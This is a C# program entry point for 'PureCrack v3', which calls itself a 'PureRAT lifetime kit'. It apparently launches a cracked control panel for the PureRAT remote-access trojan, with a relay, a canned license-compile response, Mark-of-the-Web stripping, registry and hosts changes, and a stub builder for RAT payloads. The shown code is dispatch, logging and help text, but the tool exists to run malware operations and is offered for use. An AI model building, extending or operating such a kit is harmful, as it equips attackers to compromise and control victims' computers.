using System;
using System.IO;
using System.Text;
using PureCrack.Cli;
using PureCrack.Util;

namespace PureCrack;

/// <summary>
/// PureCrack v3 entry point. Just a dispatch — every actual command lives
/// in <c>src/Cli/*Command.cs</c>. The fat orchestration that lived here in
/// v2 has been split into single-purpose files so each one is small enough
/// to hold in your head when reading.
///
/// Subcommand list (run <c>PureCrack.exe help</c> for usage):
///
///   (default)     Full kit launch — provision + verify + relay + panel.
///   verify        SHA-256 baseline check vs panel/, no launch.
///   provision     Host setup only (hosts/regkeys/ciphers/MOTW), no launch.
///   selftest      Wire-format and crypto round-trip checks.
///   smoke-build   Exercise the StubBuilder pipeline only.
///   doctor        Read-only state report.
///   cleanup       Remove all PureCrack state from this machine.
///   help          Usage.
/// </summary>
internal static class Program
{
    public static int Main(string[] args)
    {
        // Catch unhandled exceptions on background threads (relay accept loop,
        // ThreadPool work items) and route them through the same crash logger
        // so silent worker-thread crashes don't lose information.
        AppDomain.CurrentDomain.UnhandledException += (_, e) =>
        {
            WriteCrashLog("AppDomain.UnhandledException", e.ExceptionObject as Exception);
        };

        try { Console.OutputEncoding = Encoding.UTF8; }
        catch { /* console may not exist; non-fatal */ }

        try
        {
            Log.Banner("PureCrack v3.0  ─  PureRAT lifetime kit");
            Log.Kv("Workspace", Workspace.Root);
            Log.Kv("Captures",  Workspace.CapturesDir);
            Log.Kv("Stubs",     Workspace.StubsDir);

            if (!CheckEmbeddedAssets()) return PauseAndExit(1);

            return Dispatch(args);
        }
        catch (Exception ex)
        {
            WriteCrashLog("Main", ex);
            return PauseAndExit(2);
        }
    }

    /// <summary>
    /// Map argv[0] to the right command class. Default (no args) runs the
    /// full kit. Unknown commands print help and return non-zero.
    /// </summary>
    private static int Dispatch(string[] args)
    {
        if (args.Length == 0) return DefaultCommand.Run();

        switch (args[0])
        {
            case "verify":      return VerifyCommand.Run();
            case "provision":   return ProvisionCommand.Run();
            case "selftest":    return SelfTestCommand.Run();
            case "smoke-build": return SmokeBuildCommand.Run();
            case "doctor":      return DoctorCommand.Run();
            case "cleanup":     return CleanupCommand.Run();
            case "help":
            case "--help":
            case "-h":
                PrintHelp();
                return 0;
            default:
                Log.Err($"unknown subcommand: {args[0]}");
                PrintHelp();
                return 64; // EX_USAGE from sysexits.h
        }
    }

    // ============================================================================
    // Embedded-asset sanity check
    // ============================================================================

    private static bool CheckEmbeddedAssets()
    {
        try
        {
            _ = EmbeddedAssets.InnerSources.Count;
            _ = EmbeddedAssets.LoaderTemplate.Length;
            _ = EmbeddedAssets.ProtobufNetDll.Length;
            _ = EmbeddedAssets.CannedCompileResponse.Length;
            Log.Ok($"embedded assets OK ({EmbeddedAssets.InnerSources.Count} inner sources, " +
                   $"{EmbeddedAssets.ProtobufNetDll.Length:N0}b protobuf-net.dll, " +
                   $"{EmbeddedAssets.CannedCompileResponse.Length:N0}b canned /compile)");
            return true;
        }
        catch (Exception ex)
        {
            Log.Err($"embedded assets missing — corrupted EXE? {ex.Message}");
            return false;
        }
    }

    // ============================================================================
    // Crash log + pause-on-exit
    // ============================================================================

    /// <summary>
    /// Persist the unhandled exception to <c>data/last-crash.log</c> AND
    /// echo it to the console. The file survives even if the operator
    /// double-clicked the EXE and the console window vanishes on exit.
    /// </summary>
    private static void WriteCrashLog(string source, Exception? ex)
    {
        var msg =
            $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] CRASH ({source})\n" +
            $"  Message: {ex?.Message ?? "<no exception object>"}\n" +
            $"  Type:    {ex?.GetType().FullName ?? "<unknown>"}\n" +
            $"  Stack:\n{Indent(ex?.ToString() ?? "<no stack>", "    ")}\n" +
            "----------------------------------------\n";

        try { Console.Error.WriteLine(msg); } catch { /* console gone */ }

        try
        {
            var path = Path.Combine(Workspace.DataDir, "last-crash.log");
            File.AppendAllText(path, msg);
            try { Console.Error.WriteLine($"crash log: {path}"); } catch { }
        }
        catch
        {
            // Last-resort fallback: drop next to the EXE. If even this fails,
            // there's nothing useful we can do.
            try
            {
                var exeDir = Path.GetDirectoryName(typeof(Program).Assembly.Location)
                             ?? Environment.CurrentDirectory;
                File.AppendAllText(Path.Combine(exeDir, "last-crash.log"), msg);
            }
            catch { /* genuine give-up */ }
        }
    }

    private static string Indent(string s, string prefix)
    {
        if (string.IsNullOrEmpty(s)) return s;
        return prefix + s.Replace("\n", "\n" + prefix);
    }

    /// <summary>
    /// On double-click launch, the console window closes when the process
    /// exits — the operator never sees the error message. Pause for a key
    /// when stdin is interactive so they can read what happened.
    /// </summary>
    private static int PauseAndExit(int code)
    {
        try
        {
            if (!Console.IsInputRedirected)
            {
                Console.Error.WriteLine();
                Console.Error.WriteLine("Press any key to close...");
                Console.ReadKey(intercept: true);
            }
        }
        catch { /* no console or no input — fine */ }
        return code;
    }

    private static void PrintHelp()
    {
        Console.WriteLine();
        Console.WriteLine("Usage: PureCrack.exe [subcommand]");
        Console.WriteLine();
        Console.WriteLine("With no subcommand: starts the full kit (provision + verify + relay + panel).");
        Console.WriteLine();
        Console.WriteLine("Subcommands:");
        Console.WriteLine("  verify         SHA-256 baseline check against panel/, no launch.");
        Console.WriteLine("  provision      Host setup only (MOTW strip, regkeys, TLS ciphers, kill stale panels).");
        Console.WriteLine("  selftest       Wire-format and crypto round-trip checks.");
        Console.WriteLine("  smoke-build    Exercise the stub builder pipeline only (CI test).");
        Console.WriteLine("  doctor         Read-only state report (hosts / certs / data files / asset hashes).");
        Console.WriteLine("  cleanup        Remove all PureCrack state from this machine, including regkeys.");
        Console.WriteLine("  help           Show this message.");
        Console.WriteLine();
        Console.WriteLine("Environment overrides:");
        Console.WriteLine("  PURECRACK_WORKSPACE        Override workspace root (default: EXE dir).");
        Console.WriteLine("  PURECRACK_BIND_ALL=1       Bind relay on 0.0.0.0 instead of 127.0.0.1 (DANGEROUS).");
        Console.WriteLine("  PURECRACK_SKIP_ASSET_VERIFY=1  Force-launch against a drifted panel (DANGEROUS).");
        Console.WriteLine("  PURE_PANEL_EXE             Path to PureRAT.exe (default: panel/PureRAT.exe).");
        Console.WriteLine("  PURE_SETTINGS_JSON         Path to panel's Settings.json.");
    }
}
